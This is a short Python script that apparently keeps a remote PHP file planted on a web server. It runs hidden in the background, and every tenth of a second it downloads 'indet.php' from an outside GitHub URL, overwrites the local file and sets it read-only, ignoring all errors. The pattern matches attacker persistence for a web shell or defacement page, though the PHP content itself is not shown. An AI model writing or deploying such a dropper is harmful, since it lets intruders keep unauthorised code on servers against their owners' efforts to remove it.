#!/usr/bin/env python
# -*- coding: utf-8 -*-
# nohup python ko.py > /dev/null 2>&1 &
import os
import sys
import time

try:
    from urllib.request import urlopen  # Python 3
except ImportError:
    from urllib2 import urlopen  # Python 2

def force_download_and_chmod():
    try:
        response = urlopen("https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/indet.php")
        content = response.read()

        with open("indet.php", "wb") as f:
            f.write(content)

    except:
        pass  # Ignore download error

    try:
        os.chmod("indet.php", 0o444 if sys.version_info[0] == 3 else 0444)
    except:
        pass  # Ignore chmod error

def main():
    while True:
        force_download_and_chmod()
        time.sleep(0.1)

if __name__ == "__main__":
    main()